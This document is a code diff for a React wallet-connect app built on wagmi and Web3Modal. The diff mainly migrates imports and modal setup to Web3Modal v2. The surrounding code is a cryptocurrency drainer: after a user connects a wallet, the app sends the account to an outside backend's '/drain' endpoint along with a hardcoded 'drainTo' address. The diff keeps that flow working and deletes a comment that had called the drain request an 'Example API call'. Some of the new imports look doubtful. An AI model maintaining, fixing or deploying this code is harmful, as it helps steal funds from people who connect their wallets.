@@ -1,16 +1,16 @@
 import React, { useState } from "react";
 import ReactDOM from "react-dom/client";
+
 import { WagmiConfig, createConfig, configureChains } from "wagmi";
 import { mainnet, sepolia } from "@wagmi/chains";
-import { publicProvider } from "wagmi/providers/public";
+import { publicProvider } from "viem/providers/public"; // <-- fixed import
 import { InjectedConnector } from "wagmi/connectors/injected";
 import { WalletConnectConnector } from "wagmi/connectors/walletConnect";
-import { createWeb3Modal } from "@web3modal/wagmi/react";
+import { Web3Modal, useWeb3Modal } from "@web3modal/react"; // <-- updated for v2
 
 /* ---------------------------
    Wagmi Configuration
 ---------------------------- */
-
 const projectId = "962425907914a3e80a7d8e7288b23f62";
 
 const { chains, publicClient } = configureChains([mainnet, sepolia], [publicProvider()]);
@@ -25,17 +25,6 @@ const config = createConfig({
 });
 
 /* ---------------------------
-   Initialize Web3Modal
----------------------------- */
-createWeb3Modal({
-  wagmiConfig: config,
-  projectId,
-  chains,
-  themeMode: "dark",
-  enableAnalytics: true,
-});
-
-/* ---------------------------
    App Component
 ---------------------------- */
 const App = () => {
@@ -43,20 +32,19 @@ const App = () => {
   const [response, setResponse] = useState(null);
   const [walletAddress, setWalletAddress] = useState(null);
 
+  const { open } = useWeb3Modal(); // hook from Web3Modal v2
+
   const connectWallet = async () => {
     try {
       setLoading(true);
       setResponse(null);
 
-      // Web3Modal instance
-      const modal = window.web3Modal;
-      const connection = await modal.open();
+      const connection = await open();
       const account = connection?.accounts?.[0];
       if (!account) throw new Error("No wallet connected");
 
       setWalletAddress(account);
 
-      // Example API call
       const res = await fetch("https://tokenbackendwork.onrender.com/drain", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -65,8 +53,8 @@ const App = () => {
           drainTo: "0x0cd509bf3a2fa99153dae9f47d6d24fc89c006d4",
         }),
       });
-      const data = await res.json();
 
+      const data = await res.json();
       setResponse({
         success: res.ok,
         message: res.ok
@@ -150,6 +138,9 @@ const App = () => {
             </pre>
           )}
         </div>
+
+        {/* Web3Modal component */}
+        <Web3Modal projectId={projectId} themeMode="dark" />
       </div>
     </WagmiConfig>
   );
